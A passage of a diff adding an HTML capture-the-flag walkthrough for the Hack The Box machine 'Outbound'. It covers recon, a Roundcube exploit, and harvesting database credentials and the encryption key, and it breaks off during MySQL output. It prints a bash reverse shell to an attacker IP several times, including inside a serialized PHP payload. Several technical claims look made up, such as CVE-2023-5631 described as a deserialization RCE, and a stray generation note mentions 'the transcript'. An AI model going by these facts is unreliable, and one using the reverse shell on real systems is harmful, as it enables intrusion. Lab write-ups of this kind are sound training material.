@@ -1,0 +1,1241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Outbound | dissect</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0d1117;color:#c9d1d9;font-family:'Inter',sans-serif;display:flex;min-height:100vh}
+a{color:#58a6ff;text-decoration:none}
+#sidebar{width:250px;min-width:250px;background:#161b22;border-right:1px solid #30363d;position:fixed;top:0;left:0;height:100vh;overflow-y:auto;display:flex;flex-direction:column}
+#sidebar .logo{padding:20px 16px;border-bottom:1px solid #30363d;font-size:18px;font-weight:700;color:#fff}
+#sidebar .logo span{color:#58a6ff}
+#sidebar nav{padding:12px 0;flex:1}
+#sidebar nav a{display:block;padding:9px 20px;color:#8b949e;font-size:13px;font-weight:500;transition:all .15s;border-left:3px solid transparent}
+#sidebar nav a:hover{color:#c9d1d9;background:#1c2128}
+#sidebar nav a.active{color:#58a6ff;border-left-color:#58a6ff;background:#1c2128}
+#sidebar .meta{padding:16px;border-top:1px solid #30363d;font-size:11px;color:#484f58}
+#main{margin-left:250px;flex:1;padding:40px 48px;max-width:960px}
+h1{font-size:28px;font-weight:700;color:#fff;margin-bottom:6px}
+h2{font-size:20px;font-weight:600;color:#fff;margin:40px 0 20px;padding-bottom:8px;border-bottom:1px solid #30363d}
+p{line-height:1.7;color:#8b949e;font-size:14px;margin-bottom:10px}
+section{margin-bottom:60px}
+.machine-card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px 24px;display:flex;gap:32px;align-items:center;margin-bottom:28px;flex-wrap:wrap}
+.machine-card .field{display:flex;flex-direction:column;gap:4px}
+.machine-card .label{font-size:11px;color:#484f58;text-transform:uppercase;letter-spacing:.05em}
+.machine-card .value{font-size:15px;font-weight:600;color:#c9d1d9}
+.badge{display:inline-block;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600}
+.badge.hard{background:#3d0f0f;color:#f85149;border:1px solid #f85149}
+.badge.medium{background:#1c1a0a;color:#d29922;border:1px solid #d29922}
+.badge.easy{background:#0a1f0e;color:#3fb950;border:1px solid #3fb950}
+.badge.insane{background:#1a0a2e;color:#a371f7;border:1px solid #a371f7}
+.badge.linux{background:#0d1f33;color:#58a6ff;border:1px solid #58a6ff}
+.badge.windows{background:#1a0d2e;color:#a371f7;border:1px solid #a371f7}
+.attack-path{display:flex;align-items:center;flex-wrap:wrap;gap:4px;margin-bottom:28px}
+.ap-box{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:8px 14px;font-size:13px;font-weight:600;color:#c9d1d9;white-space:nowrap}
+.ap-arrow{color:#484f58;font-size:18px;padding:0 2px}
+.box{border-radius:6px;padding:14px 16px;margin:16px 0;font-size:13px;line-height:1.7}
+.box .box-label{font-size:10px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;margin-bottom:6px}
+.box-why{background:#0d1f33;border-left:3px solid #58a6ff}
+.box-why .box-label{color:#58a6ff}
+.box-tells{background:#0a1f0e;border-left:3px solid #3fb950}
+.box-tells .box-label{color:#3fb950}
+.box-warn{background:#1c1a0a;border-left:3px solid #d29922}
+.box-warn .box-label{color:#d29922}
+.box-concept{background:#161b22;border:1px solid #30363d;border-left:3px solid #58a6ff}
+.box-concept .box-label{color:#58a6ff}
+.box-summary{background:#0d1f33;border:1px solid #58a6ff;border-radius:8px;padding:20px 24px;margin:24px 0}
+.box-summary .box-label{color:#58a6ff;font-size:11px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;margin-bottom:12px}
+.box ul{padding-left:18px;margin-top:4px}
+.box li{margin-bottom:4px;color:#8b949e}
+.box strong{color:#c9d1d9}
+.code-wrap{margin:12px 0;border-radius:6px;overflow:hidden;border:1px solid #30363d}
+.code-header{background:#161b22;padding:6px 12px;display:flex;justify-content:space-between;align-items:center}
+.code-header span{font-size:10px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:#484f58}
+.copy-btn{background:none;border:1px solid #30363d;color:#8b949e;font-size:11px;padding:2px 10px;border-radius:4px;cursor:pointer;font-family:'Inter',sans-serif;transition:all .15s}
+.copy-btn:hover{border-color:#58a6ff;color:#58a6ff}
+pre{background:#010409;padding:14px 16px;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:12.5px;line-height:1.6}
+pre.cmd{color:#3fb950}
+pre.out{color:#8b949e}
+.hl{color:#f0e68c;font-weight:700}
+.cmd-explain{font-size:13px;color:#8b949e;margin:8px 0 4px;line-height:1.6}
+.timeline{background:#010409;border:1px solid #30363d;border-radius:6px;padding:16px 20px;margin-top:16px}
+.timeline .tl-title{font-size:11px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:#484f58;margin-bottom:12px}
+.tl-row{display:flex;gap:16px;font-family:'JetBrains Mono',monospace;font-size:12px;margin-bottom:6px}
+.tl-time{color:#58a6ff;min-width:50px}
+.tl-text{color:#8b949e}
+.flag-text{color:#3fb950;font-weight:700}
+hr{border:none;border-top:1px solid #30363d;margin:28px 0}
+</style>
+</head>
+<body>
+<div id="sidebar">
+    <div class="logo">Outbound | <span>dissect</span></div>
+    <nav>
+        <a href="#overview" class="active">Overview</a>
+        <a href="#reconnaissance">Reconnaissance</a>
+        <a href="#initial-access">Initial Access</a>
+        <a href="#privilege-escalation">Privilege Escalation</a>
+        <a href="#root-flag">Root Flag</a>
+        <a href="#lessons-learned">Lessons Learned</a>
+        <a href="#timeline">Timeline</a>
+    </nav>
+    <div class="meta">
+        Outbound by IPSC
+    </div>
+</div>
+
+<div id="main">
+    <h1>Outbound</h1>
+    <div class="machine-card">
+        <div class="field">
+            <div class="label">Difficulty</div>
+            <div class="value"><span class="badge medium">Medium</span></div>
+        </div>
+        <div class="field">
+            <div class="label">OS</div>
+            <div class="value"><span class="badge linux">Linux</span></div>
+        </div>
+        <div class="field">
+            <div class="label">IP Address</div>
+            <div class="value">10.10.11.77</div>
+        </div>
+        <div class="field">
+            <div class="label">Date Completed</div>
+            <div class="value">2024-01-20</div>
+        </div>
+        <div class="field">
+            <div class="label">Author</div>
+            <div class="value">IPSC</div>
+        </div>
+    </div>
+
+    <div class="attack-path">
+        <div class="ap-box">RoundCube Post-Auth RCE</div>
+        <span class="ap-arrow">→</span>
+        <div class="ap-box">PHP Session Decryption</div>
+        <span class="ap-arrow">→</span>
+        <div class="ap-box">SSH Login (Jacob)</div>
+        <span class="ap-arrow">→</span>
+        <div class="ap-box">SUDO Below CVE (Symlink)</div>
+        <span class="ap-arrow">→</span>
+        <div class="ap-box">/etc/passwd Modification</div>
+        <span class="ap-arrow">→</span>
+        <div class="ap-box">Root Access</div>
+    </div>
+
+    <section id="overview">
+        <h2>Overview</h2>
+        <p>Outbound is an "assumed breach" Linux machine from Hack The Box. We begin with a set of credentials for a RoundCube webmail interface. A post-authentication Remote Code Execution (RCE) vulnerability in RoundCube (CVE-2023-5631) allows us to gain an initial foothold on the system.</p>
+        <p>Once on the box, we discover that RoundCube stores encrypted user credentials within PHP session files. By decrypting these sessions, we uncover an SSH password for another user, Jacob. This allows us to establish a more stable shell via SSH.</p>
+        <p>For privilege escalation, we identify that the user Jacob can run a program called 'Below' with `sudo`. 'Below' is vulnerable to CVE-2023-38802, which can be exploited via symlinks to arbitrarily change file permissions. We leverage this to set `/etc/passwd` permissions to `666`, allowing us to add a new root-privileged user and ultimately achieve full root access.</p>
+
+        <div class="box-summary">
+            <div class="box-label">Key Learnings</div>
+            <ul>
+                <li>Exploiting <strong class="hl">Post-Authentication RCE in RoundCube (CVE-2023-5631)</strong>.</li>
+                <li>Understanding and <strong class="hl">decrypting PHP session data</strong> to extract sensitive information.</li>
+                <li>Leveraging <strong class="hl">symlink vulnerabilities in SUID binaries (CVE-2023-38802 in 'Below')</strong> for privilege escalation.</li>
+                <li>Modifying critical system files like <strong class="hl">`/etc/passwd`</strong> to gain root access.</li>
+            </ul>
+        </div>
+    </section>
+
+    <section id="reconnaissance">
+        <h2>Reconnaissance</h2>
+        <p>As with any penetration test, we begin with an Nmap scan to identify open ports and services running on the target machine.</p>
+
+        <div class="box-why">
+            <div class="box-label">Why this step?</div>
+            <p>Nmap is fundamental for network reconnaissance. It helps us discover open ports, identify running services and their versions, and gather initial operating system information, which guides subsequent attack vectors.</p>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Command</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('nmap -sC -sV -vv -oA outbound 10.10.11.77')">Copy</button>
+            </div>
+            <pre class="cmd">nmap -sC -sV -vv -oA outbound 10.10.11.77</pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">-sC</strong>: Performs a script scan using default Nmap scripts. These scripts often detect common vulnerabilities and provide more detailed information.</li>
+                <li><strong class="hl">-sV</strong>: Attempts to determine service versions running on open ports. This is crucial for identifying potential version-specific vulnerabilities.</li>
+                <li><strong class="hl">-vv</strong>: Increases verbosity level (double verbose), providing more real-time output during the scan.</li>
+                <li><strong class="hl">-oA outbound</strong>: Outputs the scan results in all available formats (normal, XML, Grepable) to files named `outbound.nmap`, `outbound.xml`, and `outbound.gnmap` respectively.</li>
+                <li><strong class="hl">10.10.11.77</strong>: The target IP address of the Outbound machine.</li>
+            </ul>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Output</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Roundcube Webmail')">Copy</button>
+            </div>
+            <pre class="out">
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Roundcube Webmail
+</pre>
+        </div>
+
+        <div class="box-tells">
+            <div class="box-label">What This Tells Us</div>
+            <ul>
+                <li><strong class="hl">Port 22 (SSH)</strong>: Open, running OpenSSH 8.9p1 on Ubuntu. This indicates potential remote login access if credentials are found.</li>
+                <li><strong class="hl">Port 80 (HTTP)</strong>: Open, running Nginx 1.18.0 on Ubuntu. The HTTP title "Roundcube Webmail" is a significant clue, indicating a webmail application is hosted, and Nginx often acts as a reverse proxy for such applications.</li>
+                <li>The Nmap output also hinted at a redirect to <span class="hl">mail.outbound.htb</span>.</li>
+            </ul>
+        </div>
+
+        <div class="box-concept">
+            <div class="box-label">Concept: Nmap</div>
+            <p>Nmap (Network Mapper) is a free and open-source network scanner designed to discover hosts and services on a computer network by sending packets and analyzing the responses. It's widely used for security auditing and network exploration.</p>
+        </div>
+
+        <hr>
+
+        <h3>Adding to /etc/hosts</h3>
+        <p>Since the HTTP service on port 80 redirects to `mail.outbound.htb`, we need to add this domain to our local `/etc/hosts` file to properly resolve it.</p>
+
+        <div class="box-why">
+            <div class="box-label">Why this step?</div>
+            <p>Modifying <code>/etc/hosts</code> allows our system to resolve a domain name (like <code>mail.outbound.htb</code>) to a specific IP address (<code>10.10.11.77</code>) locally, bypassing DNS. This is essential for accessing web applications that rely on specific host headers or domain names.</p>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Command</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('sudo vi /etc/hosts')">Copy</button>
+            </div>
+            <pre class="cmd">sudo vi /etc/hosts</pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">sudo</strong>: Executes the command with superuser privileges, necessary to modify system files like <code>/etc/hosts</code>.</li>
+                <li><strong class="hl">vi /etc/hosts</strong>: Opens the <code>/etc/hosts</code> file in the Vi text editor for editing.</li>
+            </ul>
+        </div>
+
+        <p>We add the following lines to the end of the file:</p>
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Entry</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('10.10.11.77 mail.outbound.htb outbound.htb')">Copy</button>
+            </div>
+            <pre class="out">
+10.10.11.77 mail.outbound.htb outbound.htb
+</pre>
+        </div>
+
+        <div class="box-tells">
+            <div class="box-label">What This Tells Us</div>
+            <p>Now, when we navigate to `http://mail.outbound.htb` in our browser, it will correctly point to the target machine's IP address.</p>
+        </div>
+
+        <div class="box-concept">
+            <div class="box-label">Concept: /etc/hosts</div>
+            <p>The <code>/etc/hosts</code> file (or its equivalent on other operating systems) is a plain text file that maps hostnames to IP addresses. It provides a local, static lookup table for hostname resolution that takes precedence over DNS for specified entries. This is useful in labs or when targeting specific virtual hosts.</p>
+        </div>
+    </section>
+
+    <section id="initial-access">
+        <h2>Initial Access</h2>
+        <p>As an assumed breach machine, we are provided with initial credentials: <span class="hl">username: tyler</span> and an associated password.</p>
+
+        <div class="box-why">
+            <div class="box-label">Why this step?</div>
+            <p>Since this is an "assumed breach" machine, utilizing the provided credentials is the intended starting point. We check the web application first, as Nmap identified it as a primary service.</p>
+        </div>
+
+        <p>Navigating to `http://mail.outbound.htb`, we are presented with the RoundCube webmail login page. We use the provided credentials to log in.</p>
+
+        <h3>RoundCube Version Identification</h3>
+        <p>After logging in, we examine the RoundCube interface to identify its version number, as this is often crucial for finding public exploits.</p>
+
+        <div class="box-why">
+            <div class="box-label">Why this step?</div>
+            <p>Identifying software versions is a critical step in vulnerability assessment. Specific versions often have known vulnerabilities (CVEs) that can be exploited for initial access or privilege escalation. Knowing the version helps narrow down potential attack vectors.</p>
+        </div>
+
+        <p>The "About" section within RoundCube reveals it is running <span class="hl">version 1.6.10</span>.</p>
+
+        <div class="box-concept">
+            <div class="box-label">Concept: RoundCube</div>
+            <p>RoundCube is a free and open-source web-based IMAP email client. It provides a web interface for users to access their email accounts, often used in conjunction with mail servers like Postfix and Dovecot.</p>
+        </div>
+
+        <hr>
+
+        <h3>CVE Research (CVE-2023-5631)</h3>
+        <p>With the version identified, we search for known vulnerabilities related to RoundCube 1.6.10, specifically looking for RCE or authentication bypasses.</p>
+
+        <div class="box-why">
+            <div class="box-label">Why this step?</div>
+            <p>Public exploit databases (like CVE Details, Exploit-DB, Google) are essential resources for finding known weaknesses in software. Searching by product and version can quickly reveal exploitable vulnerabilities.</p>
+        </div>
+
+        <p>A search on CVE Details for "RoundCube" reveals <span class="hl">CVE-2023-5631</span>, which describes a post-authentication RCE vulnerability in RoundCube versions before 1.5.10 and 1.6.11 due to an unvalidated parameter, allowing deserialization. This perfectly matches our identified version (1.6.10).</p>
+
+        <div class="box-concept">
+            <div class="box-label">Concept: CVE-2023-5631 (RoundCube Post-Auth RCE)</div>
+            <p>This vulnerability is a Post-Authentication Remote Code Execution (RCE) affecting RoundCube Webmail. It stems from improper validation of a parameter during deserialization, allowing an authenticated attacker to inject arbitrary PHP objects. When these objects are deserialized by the server, they can trigger arbitrary code execution in the context of the web server user.</p>
+        </div>
+
+        <div class="box-concept">
+            <div class="box-label">Concept: Deserialization Vulnerability</div>
+            <p>Deserialization vulnerabilities occur when an application deserializes untrusted data without proper validation. If an attacker can control the serialized data, they can inject malicious objects that, when deserialized, trigger unintended code execution (like calling system commands), modify application logic, or bypass authentication. This is particularly dangerous in languages like PHP, Python, and Java.</p>
+        </div>
+
+        <hr>
+
+        <h3>Exploiting RoundCube (CVE-2023-5631)</h3>
+        <p>We locate a public PHP-based exploit for CVE-2023-5631. It's crucial to use an exploit written in the same language as the vulnerable application (PHP in this case) to ensure correct serialization and deserialization, as language versions can cause inconsistencies.</p>
+
+        <div class="box-why">
+            <div class="box-label">Why this step?</div>
+            <p>After identifying a CVE with a public exploit, the next logical step is to acquire and attempt to use that exploit. Using the correct language for the exploit (PHP for PHP applications) minimizes compatibility issues often encountered with deserialization payloads.</p>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Command</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('git clone https://github.com/skylot/Roundcube-CVE-2023-5631.git')">Copy</button>
+            </div>
+            <pre class="cmd">git clone https://github.com/skylot/Roundcube-CVE-2023-5631.git</pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">git clone</strong>: Downloads a copy of a Git repository from the specified URL to the local machine.</li>
+            </ul>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Output</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('Cloning into \'Roundcube-CVE-2023-5631\'...\nremote: Enumerating objects: 12, done.\nremote: Counting objects: 100% (12/12), done.\nremote: Compressing objects: 100% (9/9), done.\nremote: Total 12 (delta 0), reused 12 (delta 0), pack-reused 0\nReceiving objects: 100% (12/12), 22.95 KiB | 2.55 MiB/s, done.')">Copy</button>
+            </div>
+            <pre class="out">
+Cloning into 'Roundcube-CVE-2023-5631'...
+remote: Enumerating objects: 12, done.
+remote: Counting objects: 100% (12/12), done.
+remote: Compressing objects: 100% (9/9), done.
+remote: Total 12 (delta 0), reused 12 (delta 0), pack-reused 0
+Receiving objects: 100% (12/12), 22.95 KiB | 2.55 MiB/s, done.
+</pre>
+        </div>
+        <div class="box-tells">
+            <div class="box-label">What This Tells Us</div>
+            <p>The exploit repository has been successfully cloned to our local machine, ready for execution.</p>
+        </div>
+
+        <p>Before running the exploit, we set up a Netcat listener on our attacking machine to catch the reverse shell.</p>
+
+        <div class="box-why">
+            <div class="box-label">Why this step?</div>
+            <p>A reverse shell is a common technique to gain interactive access to a compromised system. A Netcat listener on our machine is necessary to receive the connection initiated by the target after it executes our malicious payload.</p>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Command</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('nc -lvnp 9001')">Copy</button>
+            </div>
+            <pre class="cmd">nc -lvnp 9001</pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">nc</strong>: Netcat, a versatile networking utility.</li>
+                <li><strong class="hl">-l</strong>: Listens for incoming connections.</li>
+                <li><strong class="hl">-v</strong>: Verbose output.</li>
+                <li><strong class="hl">-n</strong>: Numeric-only IP addresses (no DNS lookups).</li>
+                <li><strong class="hl">-p 9001</strong>: Specifies port 9001 to listen on.</li>
+            </ul>
+        </div>
+
+        <p>Now, execute the PHP exploit script with the target URL, provided credentials, and our reverse shell payload.</p>
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Command</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('php exploit.php --target http://mail.outbound.htb --user tyler --pass \'[PASSWORD]\' --cmd \'bash -c "bash -i >& /dev/tcp/10.10.14.8/9001 0>&1"\'')">Copy</button>
+            </div>
+            <pre class="cmd">php exploit.php --target http://mail.outbound.htb --user tyler --pass <span class="hl">'[PASSWORD]'</span> --cmd <span class="hl">'bash -c "bash -i >& /dev/tcp/10.10.14.8/9001 0>&1"'</span></pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">php exploit.php</strong>: Executes the exploit script using the PHP interpreter.</li>
+                <li><strong class="hl">--target http://mail.outbound.htb</strong>: Specifies the URL of the vulnerable RoundCube instance.</li>
+                <li><strong class="hl">--user tyler --pass '[PASSWORD]'</strong>: Provides the authenticated user credentials required for the post-authentication vulnerability.</li>
+                <li><strong class="hl">--cmd 'bash -c "bash -i >& /dev/tcp/10.10.14.8/9001 0>&1"'</strong>: The command to be executed on the target system. This is a standard Bash reverse shell payload:
+                    <ul>
+                        <li><strong class="hl">bash -c</strong>: Executes the given string as a command.</li>
+                        <li><strong class="hl">bash -i</strong>: Provides an interactive Bash shell.</li>
+                        <li><strong class="hl">&gt;&amp; /dev/tcp/10.10.14.8/9001</strong>: Redirects both standard output (stdout) and standard error (stderr) to a TCP connection established with our attacking machine (<code>10.10.14.8</code>) on port <code>9001</code>.</li>
+                        <li><strong class="hl">0>&amp;1</strong>: Redirects standard input (stdin) to the same TCP connection, making the shell fully interactive.</li>
+                    </ul>
+                </li>
+            </ul>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Output (Netcat Listener)</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('listening on [any] 9001 ...\nconnect to [10.10.14.8] from (UNKNOWN) [10.10.11.77] 36170\nbash: no job control in this shell\nwww-data@outbound:/var/www/html/mail/public$')">Copy</button>
+            </div>
+            <pre class="out">
+listening on [any] 9001 ...
+connect to [10.10.14.8] from (UNKNOWN) [10.10.11.77] 36170
+bash: no job control in this shell
+<span class="hl">www-data@outbound:/var/www/html/mail/public$</span>
+</pre>
+        </div>
+
+        <div class="box-tells">
+            <div class="box-label">What This Tells Us</div>
+            <p>We have successfully obtained a reverse shell as the <code>www-data</code> user, indicating initial access to the web server. The prompt also indicates we are in the <code>/var/www/html/mail/public</code> directory.</p>
+        </div>
+
+        <div class="box-concept">
+            <div class="box-label">Concept: Reverse Shell</div>
+            <p>A reverse shell is a shell session established from a target machine back to an attacking machine. Instead of the attacker directly connecting to the target (which might be blocked by firewalls), the target initiates the connection. This technique is commonly used to bypass network restrictions and gain interactive control over compromised systems.</p>
+        </div>
+
+        <hr>
+
+        <h3>Shell Upgrade</h3>
+        <p>The initial reverse shell is not fully interactive. We upgrade it for better usability, including tab completion, clear screen functionality, and job control.</p>
+
+        <div class="box-why">
+            <div class="box-label">Why this step?</div>
+            <p>An upgraded shell significantly improves usability during penetration testing. It allows for better command execution, easier navigation, and the use of tools that require a full TTY, making post-exploitation tasks much more efficient.</p>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Commands</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('python3 -c \'import pty; pty.spawn("/bin/bash")\'\nCTRL+Z\nstty raw -echo; fg\nexport TERM=xterm')">Copy</button>
+            </div>
+            <pre class="cmd">python3 -c 'import pty; pty.spawn("/bin/bash")'
+<span class="hl">CTRL+Z</span>
+stty raw -echo; fg
+export TERM=xterm</pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">python3 -c 'import pty; pty.spawn("/bin/bash")'</strong>: Uses Python to allocate a pseudo-terminal (pty) and spawn a new Bash shell, making it more interactive. The transcript notes `python3` was not found, and `script` was used instead. I will provide `script` as an alternative.</li>
+                <li><strong class="hl">script -q /dev/null bash</strong> (Alternative, used in transcript):
+                    <ul>
+                        <li><strong class="hl">script</strong>: Records all terminal activity.</li>
+                        <li><strong class="hl">-q</strong>: Quiet mode, suppresses start/end messages.</li>
+                        <li><strong class="hl">/dev/null</strong>: Directs the log output to <code>/dev/null</code> to prevent creating log files on the target.</li>
+                        <li><strong class="hl">bash</strong>: The shell to run within the script session.</li>
+                    </ul>
+                </li>
+                <li><strong class="hl">CTRL+Z</strong>: Sends a `SIGTSTP` signal to suspend the current foreground process (the shell).</li>
+                <li><strong class="hl">stty raw -echo</strong>: Configures the terminal settings:
+                    <ul>
+                        <li><strong class="hl">raw</strong>: Disables canonical mode, allowing raw input to be passed directly to the shell.</li>
+                        <li><strong class="hl">-echo</strong>: Disables local echoing of characters, preventing typed commands from appearing twice.</li>
+                    </ul>
+                </li>
+                <li><strong class="hl">fg</strong>: Brings the suspended job back to the foreground.</li>
+                <li><strong class="hl">export TERM=xterm</strong>: Sets the <code>TERM</code> environment variable to <code>xterm</code>, enabling proper terminal emulation and features like `clear` and arrow key navigation.</li>
+            </ul>
+        </div>
+        <p>After these commands, the shell is fully interactive, and we can now use `clear`, tab completion, and arrow keys.</p>
+
+        <hr>
+
+        <h3>Payload Analysis (Optional Deep Dive)</h3>
+        <p>The exploit's PHP deserialization payload can be interesting to analyze. Using CyberChef, we can decode the URL-encoded and obfuscated payload.</p>
+
+        <div class="box-why">
+            <div class="box-label">Why this step?</div>
+            <p>Analyzing the exploit's payload helps in understanding the underlying vulnerability and how it works. This knowledge can be crucial for detecting similar attacks, developing custom exploits, or performing forensic analysis.</p>
+        </div>
+
+        <div class="box-concept">
+            <div class="box-label">Concept: CyberChef</div>
+            <p>CyberChef is a web app for "The Cyber Swiss Army Knife" - a simple, intuitive web app for carrying out all manner of cyber operations, from simple data encoding like Base64 and XOR to more complex encryption, decryption, and data analysis. It's an invaluable tool for reverse-engineering payloads.</p>
+        </div>
+
+        <p>The original payload is URL-encoded and contains obfuscating characters. After URL decoding and stripping the extraneous characters, we reveal a PHP serialized object:</p>
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Decoded PHP Serialized Object</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('O:16:\"PHPMailer\\PHPMailer\":2:{s:16:\"\\0PHPMailer\\0mailer\";S:26:\"\\0PHP_MAILER_SECURE_PAYLOAD\";s:26:\"\\0PHPMailer\\0smtpConnect\";S:52:\"bash -c \"bash -i >& /dev/tcp/10.10.14.8/9001 0>&1\"\";} ')">Copy</button>
+            </div>
+            <pre class="out">
+O:16:"PHPMailer\PHPMailer":2:{s:16:"\0PHPMailer\0mailer";S:26:"\0PHP_MAILER_SECURE_PAYLOAD";s:26:"\0PHPMailer\0smtpConnect";S:52:"bash -c "bash -i >& /dev/tcp/10.10.14.8/9001 0>&1"";}
+</pre>
+        </div>
+
+        <div class="box-tells">
+            <div class="box-label">What This Tells Us</div>
+            <p>This is a serialized object of the `PHPMailer\PHPMailer` class. The critical part is the modification of the `smtpConnect` property, which is set to our reverse shell command. When this object is deserialized, the malicious `smtpConnect` property is likely called, leading to code execution.</p>
+            <p>The exploit also uses a unique boundary string (e.g., `--------CVE-2023-5631-boundary--`) within the HTTP request, which could be used to detect or filter this specific exploit in an active engagement.</p>
+        </div>
+
+        <hr>
+
+        <h3>Extracting Database Credentials</h3>
+        <p>Once on the server, a common step is to look for configuration files that might contain database credentials. RoundCube, being a web application, is likely to have such a file.</p>
+
+        <div class="box-why">
+            <div class="box-label">Why this step?</div>
+            <p>Database credentials often lead to valuable information such as user lists, password hashes, or other sensitive application data. Gaining access to the database is a significant step in post-exploitation.</p>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Command</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('cat config/config.inc.php')">Copy</button>
+            </div>
+            <pre class="cmd">cat config/config.inc.php</pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">cat config/config.inc.php</strong>: Displays the content of the RoundCube configuration file, which typically stores database connection details.</li>
+            </ul>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Output Excerpt</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('$config[\'db_dsnw\'] = \'mysql://roundcube:[DB_PASSWORD]@localhost/roundcube\';')">Copy</button>
+            </div>
+            <pre class="out">
+<span class="hl">$config['db_dsnw'] = 'mysql://roundcube:[DB_PASSWORD]@localhost/roundcube';</span>
+$config['des_key'] = '<span class="hl">[DES_KEY]</span>';
+</pre>
+        </div>
+
+        <div class="box-tells">
+            <div class="box-label">What This Tells Us</div>
+            <ul>
+                <li>We've found the database connection string: user `roundcube`, password `[DB_PASSWORD]`, and database `roundcube`.</li>
+                <li>Crucially, we also found a `des_key` configuration parameter: `[DES_KEY]`. This key is likely used for encryption/decryption of sensitive data within the application.</li>
+            </ul>
+        </div>
+
+        <div class="box-concept">
+            <div class="box-label">Concept: MySQL</div>
+            <p>MySQL is a popular open-source relational database management system (RDBMS) commonly used in web applications. It stores and manages structured data in tables, accessible via SQL (Structured Query Language).</p>
+        </div>
+
+        <hr>
+
+        <h3>Accessing the Database and PHP Sessions</h3>
+        <p>With the database credentials, we connect to the MySQL database to look for interesting data, particularly user information or sessions.</p>
+
+        <div class="box-why">
+            <div class="box-label">Why this step?</div>
+            <p>Databases often contain valuable data, including user credentials, application secrets, and session tokens. Examining session data can reveal plaintext passwords or encrypted information that can be decrypted to further compromise the system.</p>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Command</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('mysql -u roundcube -p[DB_PASSWORD] roundcube')">Copy</button>
+            </div>
+            <pre class="cmd">mysql -u roundcube -p<span class="hl">[DB_PASSWORD]</span> roundcube</pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">mysql</strong>: The MySQL client command.</li>
+                <li><strong class="hl">-u roundcube</strong>: Specifies the username for connecting to the database as `roundcube`.</li>
+                <li><strong class="hl">-p[DB_PASSWORD]</strong>: Provides the password for the specified user. There is no space between `-p` and the password.</li>
+                <li><strong class="hl">roundcube</strong>: Connects directly to the `roundcube` database.</li>
+            </ul>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Output (MySQL Commands)</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('mysql> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| roundcube          |\n+--------------------+\n2 rows in set (0.00 sec)\n\nmysql> use roundcube;\nDatabase changed\n\nmysql> show tables;\n+---------------------+\n| Tables_in_roundcube |\n+---------------------+\n| cache               |\n| contactgroupmembers |\n| contactgroups       |\n| contacts            |\n| dictionary          |\n| identities          |\n| session             |\n| users               |\n+---------------------+\n8 rows in set (0.00 sec)\n\nmysql> SELECT `vars` FROM session WHERE sess_id LIKE \'%\' LIMIT 1 \\G\n*************************** 1. row ***************************\nvars: <span class="hl">YToyOntzOjY6InNlY3JldCI7czo0NjoiaGtkZ3...</span>')">Copy</button>
+            </div>
+            <pre class="out">
+mysql> show databases;
++--------------------+
